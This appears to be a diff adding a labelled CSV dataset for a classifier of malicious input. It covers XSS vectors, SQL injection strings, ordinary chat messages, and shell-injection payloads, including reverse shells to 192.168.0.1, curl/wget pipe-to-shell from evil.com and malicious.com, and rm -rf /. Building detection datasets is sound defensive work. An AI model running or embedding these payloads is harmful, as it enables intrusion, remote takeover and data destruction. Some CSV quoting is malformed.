@@ -1,0 +1,70 @@
+input,label
+<script>alert('XSS')</script>,xss
+<img src='x' onerror='alert(1)'>,xss
+"<body onload=\alert('XSS')\"">""",xss
+"<iframe src=\javascript:alert(1)\""></iframe>""",xss
+"<svg onload=\alert('XSS')\""></svg>""",xss
+"<b onmouseover=\alert(1)\"">hover me!</b>""",xss
+"<link rel=\stylesheet\"" href=\""javascript:alert(1)\"">""",xss
+"<div onmouseover=\alert('XSS')\"">hover</div>""",xss
+"<style>@import \javascript:alert(1)\"";</style>""",xss
+"<object data=\javascript:alert(1)\""></object>""",xss
+"<a href=\javascript:alert(1)\"">click me</a>""",xss
+"<form action=\javascript:alert(1)\""><input type=\""submit\""></form>""",xss
+"<meta http-equiv=\refresh\"" content=\""0;url=javascript:alert(1)\"">""",xss
+"<table background=\javascript:alert(1)\""></table>""",xss
+"<input type=\button\"" onclick=\""alert(1)\"" value=\""Click me\"">""",xss
+' OR '1'='1'; --,sql_injection
+' DROP TABLE users; --,sql_injection
+'; SELECT * FROM users WHERE 'a'='a,sql_injection
+'; EXEC xp_cmdshell('dir'); --,sql_injection
+'; INSERT INTO users (username password) VALUES ('admin' 'pass'); --,sql_injection
+'; UPDATE users SET password='pass' WHERE username='admin'; --,sql_injection
+1' OR '1' = '1' --,sql_injection
+'; SHUTDOWN; --,sql_injection
+admin' --,sql_injection
+' OR 1=1 --,sql_injection
+' OR 'x'='x,sql_injection
+' AND 1=0 UNION ALL SELECT NULL NULL NULL NULL --,sql_injection
+' UNION SELECT username password FROM users --,sql_injection
+' OR EXISTS(SELECT 1 FROM users) --,sql_injection
+' AND SUBSTRING(@@version 1 1) = 'X' --,sql_injection
+Hello how are you?,normal
+Just checking in to see how things are.,normal
+Can we meet at 5 PM?,normal
+Good morning have a nice day!,normal
+Thank you for your help.,normal
+See you later.,normal
+I'll call you tomorrow.,normal
+Let's catch up soon.,normal
+Please send me the report by EOD.,normal
+Happy birthday!,normal
+What's your plan for the weekend?,normal
+How's the project going?,normal
+Congratulations on your promotion!,normal
+Let me know if you need any assistance.,normal
+Have a safe trip!,normal
+$(echo hello),shell_code
+; rm -rf /,shell_code
+| nc -e /bin/sh 192.168.0.1 1234,shell_code
+& /bin/bash -i >& /dev/tcp/192.168.0.1/1234 0>&1,shell_code
+"| python -c 'import os; os.system(\/bin/bash\"")'""",shell_code
+| /bin/sh -c 'nc -lvp 1234',shell_code
+`wget http://malicious.com/malware.sh -O - | sh`,shell_code
+| exec 5<>/dev/tcp/192.168.0.1/1234; cat <&5 | while read line; do $line 2>&5 >&5; done,shell_code
+| ncat --udp 192.168.0.1 1234 -e /bin/bash,shell_code
+"; php -r '$sock=fsockopen(\192.168.0.1\"" 1234);exec(\""/bin/sh -i <&3 >&3 2>&3\"");'""",shell_code
+| curl http://malicious.com/shell.sh | sh,shell_code
+| bash -i >& /dev/tcp/192.168.0.1/8080 0>&1,shell_code
+& ncat 192.168.0.1 1234 -e /bin/sh,shell_code
+| exec 3<>/dev/tcp/192.168.0.1/1234; cat <&3 | while read cmd; do $cmd 2>&3 >&3; done,shell_code
+; wget http://evil.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh,shell_code
+& curl -s http://evil.com/shell.sh | sh,shell_code
+"| python -c 'import urllib.request; exec(urllib.request.urlopen(\http://evil.com/shell.py\"").read())'""",shell_code
+"| php -r 'file_get_contents(\http://evil.com/shell.php\"") | eval'""",shell_code
+'; /bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/1234 0>&1',shell_code
+| /bin/bash -i > /dev/tcp/192.168.0.1/1234 0<&1 2>&1,shell_code
+&& bash -i >& /dev/tcp/192.168.0.1/1234 0>&1,shell_code
+| exec 3<>/dev/tcp/192.168.0.1/1234; bash <&3 >&3 2>&3,shell_code
+; wget -q -O- http://192.168.0.1/shell.sh | bash,shell_code
+; curl -s http://192.168.0.1/shell.sh | bash,shell_code
